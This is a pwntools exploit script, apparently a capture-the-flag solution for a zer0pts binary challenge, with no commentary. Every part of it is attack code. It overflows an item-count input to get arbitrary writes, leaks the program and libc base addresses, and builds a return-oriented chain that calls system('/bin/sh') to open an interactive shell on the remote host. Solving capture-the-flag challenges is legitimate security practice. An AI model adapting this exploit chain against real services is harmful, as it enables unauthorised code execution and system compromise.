from pwn import *

# p = remote('localhost', 7777)
# p = process('./chall')
p = remote('pwn1.ctf.zer0pts.com', 9001)
e = ELF('./chall')
libc = ELF('./libc-2.31.so')

one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def f(i, addr):
    p.sendlineafter(b'quit): ', str(i).encode())
    p.sendlineafter(b'$', str(addr&0xffffffff).encode())
    p.sendlineafter(b': ', str(addr>>32).encode())

pop_rdi = 0xd53

p.sendlineafter(b'items: ', b'2305843009213693952')
p.recvuntil(b'$')
total = p.recvline()[:-1]
print(total)

q = process('./a.out')
q.sendline(total)
addr = q.recvline()[:-1].split()
e.address = int(hex(int(addr[1]))[2:]+hex(int(addr[0]))[2:], 16) - (e.symbols['main']+191)
print(hex(e.address))

pop_rdi += e.address

p.sendlineafter(b'Yes] ', b'1')
f(2, e.symbols['main'])
f(1, e.plt['puts'])
f(0, e.got['puts'])
f(2305843009213693951, pop_rdi)

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
print(hex(libc.address))

p.sendlineafter(b'items: ', b'2305843009213693952')
p.sendlineafter(b'Yes] ', b'1')
f(2, libc.symbols['system'])
f(1, next(libc.search(b'/bin/sh')))
f(0, pop_rdi)
f(2305843009213693951, pop_rdi+1)

p.interactive()
